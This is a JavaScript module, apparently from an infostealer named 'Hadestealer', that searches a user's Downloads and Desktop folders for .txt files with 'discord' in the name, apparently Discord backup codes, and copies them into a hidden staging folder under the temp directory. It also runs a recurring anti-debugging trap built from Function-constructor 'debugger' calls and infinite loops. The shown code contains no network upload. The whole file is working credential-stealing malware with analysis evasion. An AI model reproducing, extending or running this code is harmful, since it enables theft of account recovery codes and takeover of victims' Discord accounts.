"use strict";

const fs = require("fs");
const path = require("path");
const os = require("os");

async function processBackupCodes(destinationDir) {
    const homeDir = os.homedir();
    const searchPaths = [
        path.join(homeDir, "Downloads"),
        path.join(homeDir, "Desktop")
    ];

    for (const searchPath of searchPaths) {
        try {
            if (!fs.existsSync(searchPath)) continue;

            const files = fs.readdirSync(searchPath, { withFileTypes: true });

            for (const file of files) {
                if (file.isSymbolicLink()) continue;

                const fileName = file.name;
                if (fileName.endsWith(".txt") && fileName.includes("discord")) {
                    const sourceFilePath = path.join(searchPath, fileName);
                    const destFilePath = path.join(destinationDir, fileName);

                    try {
                        fs.copyFileSync(sourceFilePath, destFilePath);
                    } catch (copyError) {
                        console.error("Dosya kopyalanamadı: " + fileName, copyError);
                    }
                }
            }
        } catch (err) {
            if (err.code === "EPERM" || err.code === "EACCES") {
                continue;
            }
        }
    }
}

async function processBackupCodesSendAll() {
    const tempWorkDir = path.join(os.tmpdir(), "Hadestealer", "All", "Discord");

    if (!fs.existsSync(tempWorkDir)) {
        fs.mkdirSync(tempWorkDir, { recursive: true });
    }

    try {
        await processBackupCodes(tempWorkDir);
        
        await new Promise(resolve => setTimeout(resolve, 100));

        const collectedFiles = fs.readdirSync(tempWorkDir);
        if (collectedFiles.length === 0) {
            return;
        }
    } catch (err) {
        console.log(err);
    }
}

function antiDebug(counter) {
    function debuggerTrap(val) {
        if (typeof val === "string") {
            return function() {}.constructor("while (true) {}").apply("counter");
        } else if (("" + val / val).length !== 1 || val % 20 === 0) {
            (function() { return true; }).constructor("debugger").call("action");
        } else {
            (function() { return false; }).constructor("debugger").apply("stateObject");
        }
        debuggerTrap(++val);
    }

    try {
        if (counter) {
            return debuggerTrap;
        } else {
            debuggerTrap(0);
        }
    } catch (e) {}
}

setInterval(antiDebug, 4000);

exports.processBackupCodes = processBackupCodes;
exports.processBackupCodesSendAll = processBackupCodesSendAll;
